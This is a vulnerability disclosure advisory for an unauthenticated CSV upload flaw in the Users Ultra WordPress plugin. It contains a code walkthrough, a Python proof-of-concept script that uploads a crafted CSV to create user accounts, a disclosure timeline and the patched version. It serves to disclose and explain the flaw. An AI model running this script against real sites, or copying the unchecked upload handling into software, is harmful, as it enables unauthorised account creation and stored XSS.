@@ -1,0 +1,96 @@
+* Exploit Title: WordPress Users Ultra Plugin [Unrestricted File Upload]
+* Discovery Date: 2015/10/27
+* Public Disclosure Date: 2015/12/01
+* Exploit Author: Panagiotis Vagenas
+* Contact: https://twitter.com/panVagenas
+* Vendor Homepage: http://usersultra.com
+* Software Link: https://wordpress.org/plugins/users-ultra/
+* Version: 1.5.50
+* Tested on: WordPress 4.3.1
+* Category: webapps
+
+Description
+================================================================================
+
+WordPress plugin `Users Ultra Plugin` suffers for an unrestricted file upload vulnerability.
+
+Any user (registered or not) can exploit a misbehavior of the plugin in order to upload csv files to the infected website. Although the plugin checks file extension using an extensions white-list (in this case only csv files are white-listed), no other checks (mime, size etc) are taking place. This alone can expose the infected website to a variety of attacks, please see [OWASP Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload) to get an idea.
+
+Details
+================================================================================
+
+The plugin workflow that could allow a malicious user to exploit this misbehavior is as follows:
+
+1. Upon initialization of the plugin (anytime if it is activated) an instance of `XooUserUser` class is created
+2. In the constructor of `XooUserUser` class a check for POST variable `uultra-form-cvs-form-conf` is taking place
+    file `wp-content/plugins/users-ultra/xooclasses/xoo.userultra.user.php` lines 19-23
+    ```php
+    if (isset($_POST['uultra-form-cvs-form-conf'])) 
+    {
+	    /* Let's Update the Profile */
+	    $this->process_cvs($_FILES);				
+    }
+    ```
+3. Assuming the POST variable `uultra-form-cvs-form-conf` has been set in the request, the method `XooUserUser::process_cvs()` is called.
+4. `XooUserUser::process_cvs()` method process every file in $_FILES super-global by only making a check if the file has a `csv` extension
+
+In addition we mark the following points:
+
+1. A malicious user can create and activate user accounts by exploiting this vulnerability if `$_POST["uultra-activate-account"]` is set to `active`
+2. A welcome email is send if `$_POST["uultra-send-welcome-email"]` is set to 1
+3. The csv files uploaded to the server are stored in a directory (`wp-content/usersultramedia/import` by default) accessible by anyone
+4. Any additional columns present in the csv file are stored in `usermeta`
+5. No sanitization for values in csv file can easily lead to a Persistent XSS attack, so an attacker can compromise the whole site
+
+PoC
+================================================================================
+
+The following Python3 script forms a csv file and uploads it to a site
+
+```python3
+#!/usr/bin/python3
+import requests
+import csv
+import tempfile
+
+url = 'http://example.com/'
+
+postData = {
+    'uultra-form-cvs-form-conf': 1,
+    'uultra-send-welcome-email': 1,
+    'uultra-activate-account': 'pending'
+}
+
+csvFileHeader = ['user name', 'email', 'display name', 'registration date', 'first name', 'last name', 'age', 'country']
+csvFileRow = ['userName', 'email@example.com', 'User Name', '1/1/1', 'User', 'Name', '100', 'IO']
+
+csvFile = tempfile.NamedTemporaryFile(mode='a+t', suffix='.csv')
+
+wr = csv.writer(csvFile, quoting=csv.QUOTE_ALL, delimiter=',')
+
+wr.writerow(csvFileHeader)
+wr.writerow(csvFileRow)
+
+csvFile.seek(0)
+
+files = {'file.csv': csvFile}
+
+r = requests.post(url, data=postData, files=files)
+
+exit(0)
+```
+
+Timeline
+================================================================================
+
+2015/10/29 - Vendor notified via email
+2015/11/11 - Vendor notified via contact form in his website
+2015/11/13 - Vendor notified via support forums at wordpress.org
+2015/11/14 - Vendor responded and received report through email
+2015/11/15 - Vendor responded
+2015/11/15 - Patch released
+
+Solution
+================================================================================
+
+Update to version 1.5.59
